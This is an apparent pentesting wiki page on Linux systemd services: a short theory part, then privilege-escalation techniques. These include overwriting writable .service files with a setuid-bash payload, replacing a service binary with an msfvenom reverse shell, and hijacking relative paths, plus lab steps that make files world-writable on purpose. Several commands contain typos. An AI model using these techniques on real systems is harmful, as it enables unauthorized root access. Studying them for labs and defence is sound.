# Services

## Theory

A Linux systems provide a variety of system services (such as process management, login, syslog, cron, etc.) and network services (such as remote login, e-mail, printers, web hosting, data storage, file transfer, domain name resolution (using DNS), dynamic IP address assignment (using DHCP), and much more).

Technically, a service is a process or group of processes (commonly known as daemons) that run continuously in the background, waiting to be used or performing some tasks.

Linux supports different ways to manage (start, stop, restart, enable auto-start at system boot, etc.) services, typically through a process or service manager. Most if not all modern Linux distributions now use the same process manager: `systemd`.

### Service Configuration Files <a href="#service-configuration-files" id="service-configuration-files"></a>

Service configuration files in Linux have the extension **.service**, which is a service unit that describes how to manage a service or application on the server. This will include how to **start** or **stop** the service, under what circumstances it should start automatically, and related software dependency and ordering information.

To understand systemd units and units files, read this [article](https://www.digitalocean.com/community/tutorials/understanding-systemd-units-and-unit-files).

The following table provides a complete list of SysV runlevels and their corresponding systemd targets:

| Runlevel | Target Units                                  | Description                               |
| -------- | --------------------------------------------- | ----------------------------------------- |
| 0        | `runlevel0.target, poweroff.target`           | Shut down and power off the system.       |
| 1        | `runlevel1.target, rescue.target`             | Set up a rescue shell.                    |
| 2,3,4    | `runlevel[2,3,4].target`, `multi-user.target` | Set up a non-graphical multi-user system. |
| 5        | `runlevel5.target`, `graphical.target`        | Set up a graphical multi-user system.     |
| 6        | `runlevel6.target`, `reboot.target`           | Shut down and reboot the system.          |

{% hint style="info" %}
Reference: [https://access.redhat.com/documentation/en-us/red\_hat\_enterprise\_linux/8/html/configuring\_basic\_system\_settings/working-with-systemd-targets\_configuring-basic-system-settings](https://access.redhat.com/documentation/en-us/red\_hat\_enterprise\_linux/8/html/configuring\_basic\_system\_settings/working-with-systemd-targets\_configuring-basic-system-settings)
{% endhint %}

## Practice

### Writable .service files <a href="#privilege-escalation-via-writable-_service_-files" id="privilege-escalation-via-writable-_service_-files"></a>

{% tabs %}
{% tab title="Privilege Escalation" %}
Check if you can write a **.service** file. If you can, you **could modify** it to **run** your **malicious code**. However, you will need to **start**, **stop** or **restart** the service, which can be accomplished if you have **SUDO/SUID permissions** in `systemctl` or you can wait for the machine to reboot.

To detect that we can write about a service, we can do:

```bash
ls -l /etc/systemd/ # If we have write permissions on the "system" directory, we can write services.
ls -l /etc/systemd/system
find /etc/systemd/system -writable 2>/dev/null
```

If we have permissions on a .service file, we can overwrite it with the following content:

```shell
[Service]
Type=oneshot
ExecStart=/bin/sh -c "<COMMAND>" # We can also run a script: /tmp/shell.sh
[Install]
WantedBy=multi-user.target
```

If we do not want to alter the structure of the service configuration file, we can change the user and group that runs that service, adding the command to execute:

```shell
[Unit]
Description=asdasd
After=network.target

[Service]
User=www-data # Change to "root".
Group=www-data # Change to "root".
WorkingDirectory=/var/www/html
ExecStart=/bin/chmod +s /bin/bash # Payload
ExecReload=/bin/chmod +s /bin/bash # Payloa
ExecStop=/bin/chmod +s /bin/bash # Payloa

[Install]
WantedBy=multi-user.target
```

Finally, you have to start or restart the service for it to work.
{% endtab %}

{% tab title="Lab Setup" %}
```bash
sudo nvim /etc/systemd/system/insecure.service
```

{% code title="insecure.service" %}
```shell
[Unit]
Description=Insecure service config

[Service]
Type=basic
ExecStart=/usr/bin/apache2

[Install]
WantedBy=multi-user.target
```
{% endcode %}

Add write permissions to the **.service** file:

```bash
sudo chmod o+w /ec/systemd/system/insecure.servic
```
{% endtab %}
{% endtabs %}

### Writable service binaries

{% tabs %}
{% tab title="Privilege Escalation" %}
Keep in mid that if you have **write permissions over binaries being executed by services**, you can change them for backdoors so when the services get re-executed the backdoors will be executed.

```bash
find /etc/systemd/system -exec grep -r -i "ExecStart" 2>/dev/null {} +
```

Then we should check if those binaries or scripts have write permissions.

If a binary (which is executed by a service) has write permissions, we generate our backdoor with **msfvenom**:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell
```

We transfer the backdoor, overwrite the binary (make a backup before) and then re-initialize the service.
{% endtab %}

{% tab title="Lab Setup" %}
```
sudo nvim /etc/systemd/system/writable_binary.service
```

```bash
[Unit]
Description=Insecure service config

[Service]
Type=basic
ExecStart=/usr/bin/apache2

[Install]
WantedBy=multi-user.target
```

```bash
sudo cp /usr/bin/apache2 /usr/bin/apache2.bak # Backup
chmod o+w /usr/bin/apache2
```
{% endtab %}
{% endtabs %}

### systemd PATH - Relative Paths

You can see the PATH used by **systemd** with:

```bash
systemctl show-environment
```

If you find that you can **write** in any of the folders of the path you may be able to **escalate privileges**. You need to search for **relative paths being used on service configurations** files like:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Then, create a **executable** with the **same name as the relative path binary** inside the systemd PATH folder you can write, and when the service is asked to execute the vulnerable action (**Start**, **Stop**, **Reload**), your **backdoor will be executed** (unprivileged users usually cannot start/stop services but check if you can using `sudo -l`).
